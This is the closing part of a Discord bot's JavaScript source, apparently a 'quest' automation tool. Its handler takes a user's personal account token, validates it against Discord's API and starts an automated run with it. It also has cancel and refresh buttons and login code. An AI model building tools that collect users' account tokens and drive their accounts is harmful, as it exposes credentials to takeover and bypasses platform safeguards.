      const me = (await axios.get(API + '/users/@me', { headers: mkHeaders(token) })).data;
      return startRun(i, token, me);
    } catch (e) {
      const st = e.response?.status;
      const why = (st === 401 || st === 403)
        ? 'Discord rejected that token (401). It is the bot token, an expired token, or was copied with quotes around it.'
        : 'Token check failed: ' + (st || e.message);
      return i.editReply({
        content: why + '\nClick below to try again.',
        components: [new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId('q:token').setLabel('Re-enter token')
            .setStyle(ButtonStyle.Primary),
        )],
      });
    }
  }

  if (i.isButton()) {
    const state = runs.get(i.user.id);
    if (!state) {
      return i.reply({ content: 'This panel is no longer tracked.', flags: MessageFlags.Ephemeral });
    }
    if (i.customId === 'q:cancel') {
      if (!state.done) { state.cancelled = true; log(state, 'Cancel requested', 'warn'); }
      await flush(state);
      return i.reply({ content: state.done ? 'Already finished.' : 'Cancelling…', flags: MessageFlags.Ephemeral });
    }
    if (i.customId === 'q:refresh') {
      await render(state);
      return i.reply({ content: 'Panel refreshed.', flags: MessageFlags.Ephemeral });
    }
  }
});

setInterval(() => {
  for (const s of runs.values()) if (!s.done) touch(s);
  const now = Date.now();
  for (const [uid, p] of pending) if (now - p.at > PENDING_TTL) pending.delete(uid);
}, 5000);

process.on('unhandledRejection', e => console.error('unhandledRejection:', e?.message || e));

if (!BOT_TOKEN) {
  console.error('Missing BOT_TOKEN. Run:  node --env-file=.env questbot.js');
  process.exit(1);
}
client.login(BOT_TOKEN);
